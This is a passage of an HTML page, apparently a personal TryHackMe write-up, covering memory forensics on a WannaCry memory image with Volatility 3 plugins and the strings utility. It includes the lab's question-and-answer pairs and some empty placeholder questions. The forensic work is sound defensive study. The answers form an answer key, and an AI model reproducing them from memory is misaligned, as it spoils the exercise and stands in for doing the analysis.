+</span><span class="mi">348</span><span class="w">	</span><span class="mi">4</span><span class="w">	</span><span class="n">smss.exe</span><span class="w">	</span><span class="nx">0x2169020</span><span class="w">	</span><span class="nx">3</span><span class="w">	</span><span class="nx">19</span><span class="w">	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:21:55.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">620</span><span class="w">	</span><span class="mi">348</span><span class="w">	</span><span class="n">winlogon.exe</span><span class="w">	</span><span class="nx">0x216e020</span><span class="w">	</span><span class="nx">23</span><span class="w">	</span><span class="nx">536</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:01.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">676</span><span class="w">	</span><span class="mi">620</span><span class="w">	</span><span class="n">lsass.exe</span><span class="w">	</span><span class="nx">0x2191658</span><span class="w">	</span><span class="nx">23</span><span class="w">	</span><span class="nx">353</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:01.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">664</span><span class="w">	</span><span class="mi">620</span><span class="w">	</span><span class="n">services.exe</span><span class="w">	</span><span class="nx">0x21937f0</span><span class="w">	</span><span class="nx">15</span><span class="w">	</span><span class="nx">265</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:01.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">1024</span><span class="w">	</span><span class="mi">664</span><span class="w">	</span><span class="n">svchost.exe</span><span class="w">	</span><span class="nx">0x21af7e8</span><span class="w">	</span><span class="nx">79</span><span class="w">	</span><span class="nx">1366</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:03.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">904</span><span class="w">	</span><span class="mi">664</span><span class="w">	</span><span class="n">svchost.exe</span><span class="w">	</span><span class="nx">0x21b5230</span><span class="w">	</span><span class="nx">9</span><span class="w">	</span><span class="nx">227</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:03.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">1152</span><span class="w">	</span><span class="mi">664</span><span class="w">	</span><span class="n">svchost.exe</span><span class="w">	</span><span class="nx">0x21bea78</span><span class="w">	</span><span class="nx">10</span><span class="w">	</span><span class="nx">173</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:06.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">1636</span><span class="w">	</span><span class="mi">1608</span><span class="w">	</span><span class="n">explorer.exe</span><span class="w">	</span><span class="nx">0x21d9da0</span><span class="w">	</span><span class="nx">11</span><span class="w">	</span><span class="nx">331</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:10.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">1484</span><span class="w">	</span><span class="mi">664</span><span class="w">	</span><span class="n">spoolsv.exe</span><span class="w">	</span><span class="nx">0x21e2da0</span><span class="w">	</span><span class="nx">14</span><span class="w">	</span><span class="nx">124</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:09.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">1940</span><span class="w">	</span><span class="mi">1636</span><span class="w">	</span><span class="n">tasksche.exe</span><span class="w">	</span><span class="nx">0x2218da0</span><span class="w">	</span><span class="nx">7</span><span class="w">	</span><span class="nx">51</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:14.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">836</span><span class="w">	</span><span class="mi">664</span><span class="w">	</span><span class="n">svchost.exe</span><span class="w">	</span><span class="nx">0x221a2c0</span><span class="w">	</span><span class="nx">19</span><span class="w">	</span><span class="nx">211</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:02.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">1956</span><span class="w">	</span><span class="mi">1636</span><span class="w">	</span><span class="n">ctfmon.exe</span><span class="w">	</span><span class="nx">0x2231da0</span><span class="w">	</span><span class="nx">1</span><span class="w">	</span><span class="nx">86</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:14.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">4</span><span class="w">	</span><span class="mi">0</span><span class="w">	</span><span class="n">System</span><span class="w">	</span><span class="nx">0x23c8830</span><span class="w">	</span><span class="nx">51</span><span class="w">	</span><span class="nx">244</span><span class="w">	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="dlllist">DllList</h3>
+
+<p>This plugin lists the loaded modules in a particular Windows memory image.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vol3 <span class="nt">-f</span> wcry.mem windows.dlllist.DllList
+</code></pre></div></div>
+
+<h3 id="malfind">Malfind</h3>
+
+<p>This plugin is used to lists process memory ranges that potentially contain injected code.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vol3 -f wcry.mem windows.malfind.Malfind
+</code></pre></div></div>
+
+<p>For more information regarding other plugins, you may check this <a href="https://volatility3.readthedocs.io/en/stable/volatility3.plugins.html">link</a>.</p>
+
+<p>Now, you have the plugins running individually and seeing the result. What you will do now is process this in bulk. Remember, one of the investigative practices involves preprocessing evidence and saving the results to text files, right? The question is how?</p>
+
+<p>The answer? Do a loop statement! See the command below.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>plugin <span class="k">in </span>windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList<span class="p">;</span> <span class="k">do </span>vol3 <span class="nt">-q</span> <span class="nt">-f</span> wcry.mem <span class="nv">$plugin</span> <span class="o">&gt;</span> wcry.<span class="nv">$plugin</span>.txt<span class="p">;</span> <span class="k">done</span>
+</code></pre></div></div>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">-q</code> =  quiet mode or does not show the progress in the terminal</li>
+  <li><code class="language-plaintext highlighter-rouge">-f</code> = read from the memory capture.</li>
+</ul>
+
+<h3 id="preprocessing-with-strings">Preprocessing With Strings</h3>
+
+<p>Next, we will preprocess the memory image with the Linux strings utility. We will extract the <strong>ASCII</strong>, 16-bit <strong>little-endian</strong>, and 16-bit <strong>big-endian</strong> strings.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="err">@</span><span class="nx">10.80.169.119:/home/ubuntu/Desktop/tasks/Wcry_memory_image</span><span class="err">$</span><span class="w"> </span><span class="nx">strings</span><span class="w"> </span><span class="nx">wcry.mem</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">wcry.strings.ascii.txt</span><span class="w">
+</span><span class="n">root</span><span class="err">@</span><span class="nx">10.80.169.119:/home/ubuntu/Desktop/tasks/Wcry_memory_image</span><span class="err">$</span><span class="w"> </span><span class="nx">strings</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="nx">l</span><span class="w">  </span><span class="nx">wcry.mem</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">wcry.strings.unicode_little_endian.txt</span><span class="w">
+</span><span class="n">root</span><span class="err">@</span><span class="nx">10.80.169.119:/home/ubuntu/Desktop/tasks/Wcry_memory_image</span><span class="err">$</span><span class="w"> </span><span class="nx">strings</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="nx">b</span><span class="w">  </span><span class="nx">wcry.mem</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">wcry.strings.unicode_big_endian.txt</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="questions-2">Questions</h3>
+
+<p>Q: What plugin lists processes in a tree based on their parent process ID?</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">PsTree</code></p>
+
+<p>Q: What plugin is used to list all currently active processes in the machine?</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">PsList</code></p>
+
+<p>Q: What Linux utility tool can extract the ASCII, 16-bit little-endian, and 16-bit big-endian strings?</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">strings</code></p>
+
+<p>Q: By running vol3 with the Malfind parameter, what is the first (1st) process identified suspected of having an injected code?</p>
+
+<p><img src="/tryhackme/REMnux%20-%20Getting%20Started/2025-12-09_16-13.png" alt="" /></p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">csrss.exe</code></p>
+
+<p>Q: Continuing from the previous question (Question 4), what is the second (2nd) process identified suspected of having an injected code?</p>
+
+<p><img src="/tryhackme/REMnux%20-%20Getting%20Started/2025-12-09_16-14.png" alt="" /></p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">winlogon.exe</code></p>
+
+<p>Q: By running vol3 with the DllList parameter, what is the file path or directory of the binary @WanaDecryptor@.exe?</p>
+
+<p><img src="/tryhackme/REMnux%20-%20Getting%20Started/2025-12-09_16-17.png" alt="" /></p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">C:\Intel\ivecuqmanpnirkt615\@WanaDecryptor@.exe</code></p>
+
+<h2 id="section-4">Section 4</h2>
+
+<h3 id="questions-3">Questions</h3>
+
+<p>Q:</p>
+
+<p>A: ``</p>
+
+<p>Q:</p>
+
+<p>A: ``</p>
+
+<p>Q:</p>
+
+<p>A: ``</p>
+
+        </article>
+
+        <!-- Back button -->
+        <div class="writeup-footer-nav">
+          <a href="/tryhackme/" class="btn-ghost">← Back to Index</a>
+        </div>
+      </div>
+
+    </div><!-- /.writeup-body -->
+
+  </div>
+</main>
+
+<!-- Floating ToC toggle (shown when sidebar is hidden) -->
+<button class="toc-fab" id="tocFab" aria-label="Open table of contents" style="display:none;">
+  ☰ <span>ToC</span>
+</button>
+
+<script>
+(function () {
+  const sidebar  = document.getElementById('tocSidebar');
+  const tocNav   = document.getElementById('tocNav');
+  const toggleBtn = document.getElementById('tocToggle');
+  const fab      = document.getElementById('tocFab');
+  const content  = document.getElementById('writeupContent');
+
+  /* ── Build ToC from headings ── */
+  const headings = Array.from(content.querySelectorAll('h2, h3'));
+
+  if (headings.length === 0) {
+    // leave the "No headings" placeholder
+  } else {
+    tocNav.innerHTML = '';
+    headings.forEach((h, i) => {
+      // Ensure every heading has an id we can link to
+      if (!h.id) {
+        h.id = 'toc-heading-' + i + '-' + h.textContent.trim()
+                .toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '');
+      }
+      const a = document.createElement('a');
+      a.href = '#' + h.id;
+      a.textContent = h.textContent;
+      a.className = 'toc-link toc-' + h.tagName.toLowerCase();
+      a.addEventListener('click', function (e) {
+        e.preventDefault();
+        document.getElementById(h.id).scrollIntoView({ behavior: 'smooth', block: 'start' });
+        // on mobile, close after click
+        if (window.innerWidth < 1024) hideSidebar();
+      });
+      tocNav.appendChild(a);
+    });
+  }
+
+  /* ── Highlight active heading on scroll ── */
+  const observer = new IntersectionObserver(entries => {
+    entries.forEach(entry => {
+      const link = tocNav.querySelector('a[href="#' + entry.target.id + '"]');
+      if (!link) return;
+      if (entry.isIntersecting) {
+        tocNav.querySelectorAll('.toc-link').forEach(l => l.classList.remove('active'));
+        link.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-60px 0px -70% 0px', threshold: 0 });
+
+  headings.forEach(h => observer.observe(h));
+
+  /* ── Show / hide ── */
+  function showSidebar() {
+    sidebar.classList.add('open');
+    sidebar.setAttribute('aria-hidden', 'false');
+    fab.style.display = 'none';
+    localStorage.setItem('tocOpen', '1');
+  }
+  function hideSidebar() {
+    sidebar.classList.remove('open');
+    sidebar.setAttribute('aria-hidden', 'true');
+    fab.style.display = 'flex';
+    localStorage.setItem('tocOpen', '0');
+  }
+
+  toggleBtn.addEventListener('click', hideSidebar);
+  fab.addEventListener('click', showSidebar);
+
+  /* ── Restore preference ── */
+  const isMobile = () => window.innerWidth < 1024;
+  const pref = localStorage.getItem('tocOpen');
+
+  if (isMobile()) {
+    hideSidebar();
+  } else if (pref === '0') {
+    hideSidebar();
+  } else {
+    showSidebar();
+  }
+
+  window.addEventListener('resize', () => {
+    if (isMobile()) {
+      hideSidebar();
+    } else if (localStorage.getItem('tocOpen') !== '0') {
+      showSidebar();
+    }
+  });
+})();
+</script>
+
+<script>
+/* ── Q&A Card Builder ── */
+(function () {
+  const article = document.getElementById('writeupContent');
+  if (!article) return;
+
+  // Mark "Questions" h3 headings
+  article.querySelectorAll('h3').forEach(h => {
+    if (h.textContent.trim().toLowerCase() === 'questions') {
+      h.classList.add('is-questions');
+    }
+  });
+
+  /*
+    Algorithm:
+    - Take a live snapshot of direct children
+    - Scan forward; when we see a <p> starting with "Q:", enter collection mode
+    - Collect all nodes into `questionNodes` until we hit a <p> starting with "A:"
+    - Collect `answerNodes` from "A:" until the next Q:, heading, or end
+    - Build a .qa-block and splice it in place of those nodes
+  */
+
+  function startsWithQ(el) {
+    return el.tagName === 'P' && /^Q:/i.test(el.textContent.trim());
+  }
+  function startsWithA(el) {
+    return el.tagName === 'P' && /^A:/i.test(el.textContent.trim());
+  }
+  function isHeading(el) {
+    return /^H[1-6]$/.test(el.tagName);
+  }
+
+  function buildCard(questionNodes, answerPara, answerNodes) {
+    const block = document.createElement('div');
+    block.className = 'qa-block';
+
+    /* ── Question ── */
+    const qRow = document.createElement('div');
+    qRow.className = 'qa-question';
+
+    const qBadge = document.createElement('span');
+    qBadge.className = 'qa-q-badge';
+    qBadge.textContent = 'Q';
+    qRow.appendChild(qBadge);
+
+    const qBody = document.createElement('div');
+    qBody.className = 'qa-question-body';
+
+    // First node is the Q: paragraph — strip the prefix, use its innerHTML
+    const qPara = questionNodes[0];
+    qBody.innerHTML = qPara.innerHTML.replace(/^Q:\s*/i, '');
+
+    // Remaining question nodes (walkthrough: images, code, prose)
+    questionNodes.slice(1).forEach(n => qBody.appendChild(n.cloneNode(true)));
+
+    qRow.appendChild(qBody);
+    block.appendChild(qRow);
+
+    /* ── Reveal button ── */
+    const btn = document.createElement('button');
+    btn.className = 'qa-reveal-btn';
+    btn.innerHTML = '<span class="qa-chevron">▼</span><span>reveal answer</span>';
+    block.appendChild(btn);
+
+    /* ── Answer ── */
+    const aPanel = document.createElement('div');
+    aPanel.className = 'qa-answer';
+
+    const aBadge = document.createElement('span');
+    aBadge.className = 'qa-a-badge';
+    aBadge.textContent = 'A';
+    aPanel.appendChild(aBadge);
+
+    const aBody = document.createElement('div');
+    aBody.className = 'qa-answer-body';
+
+    if (answerPara) {
+      // Strip "A:" prefix from the answer paragraph
+      const stripped = answerPara.innerHTML.replace(/^A:\s*/i, '').trim();
+      if (stripped) aBody.innerHTML = stripped;
+      // Trailing images / code
+      answerNodes.forEach(n => aBody.appendChild(n.cloneNode(true)));
+    } else {
+      aBody.innerHTML = '<em style="color:var(--text-dim)">—</em>';
+    }
+
+    aPanel.appendChild(aBody);
+    block.appendChild(aPanel);
+
+    /* ── Toggle ── */
+    btn.addEventListener('click', () => {
+      const isOpen = aPanel.classList.toggle('open');
+      btn.classList.toggle('open', isOpen);
+      btn.querySelector('span:last-child').textContent = isOpen ? 'hide answer' : 'reveal answer';
+    });
+
+    return block;
+  }
+
+  // Work on a snapshot so DOM mutations don't affect iteration
+  let children = Array.from(article.children);
+  let i = 0;
+
+  while (i < children.length) {
+    const el = children[i];
+
+    if (startsWithQ(el)) {
+      const questionNodes = [el]; // first node = Q: paragraph
+      let j = i + 1;
+
+      // Absorb everything until we hit A: or a heading or end
+      while (j < children.length && !startsWithA(children[j]) && !isHeading(children[j])) {
+        // Stop if we hit another Q: (back-to-back questions)
+        if (startsWithQ(children[j])) break;
+        questionNodes.push(children[j]);
+        j++;
+      }
+
+      let answerPara = null;
+      const answerNodes = [];
+
+      if (j < children.length && startsWithA(children[j])) {
+        answerPara = children[j];
+        j++;
+        // Absorb trailing images/code/blockquotes as part of answer
+        while (j < children.length &&
+               !startsWithQ(children[j]) &&
+               !startsWithA(children[j]) &&
+               !isHeading(children[j])) {
+          answerNodes.push(children[j]);
+          j++;
+        }
+      }
+
+      // Build card
+      const card = buildCard(questionNodes, answerPara, answerNodes);
+
+      // Insert before the first consumed node
+      article.insertBefore(card, el);
+
+      // Remove all consumed original nodes
+      [...questionNodes, ...(answerPara ? [answerPara] : []), ...answerNodes]
+        .forEach(n => { if (n.parentNode === article) article.removeChild(n); });
+
+      // Refresh snapshot after DOM mutation
+      children = Array.from(article.children);
+      // Find where the card landed and continue from there
+      i = children.indexOf(card) + 1;
+    } else {
+      i++;
+    }
+  }
+})();
+</script>
+
+<footer class="site-footer">
+  <div class="footer-inner">
+    <span class="footer-text"><span class="prompt">george@kali:~$</span> echo "George Nădejde · TryHackMe Writeups"</span>
+    <div class="footer-links">
+      <a href="https://georgenadejde.github.io" target="_blank" rel="noopener noreferrer">Portfolio</a>
+      <a href="https://github.com/georgenadejde" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
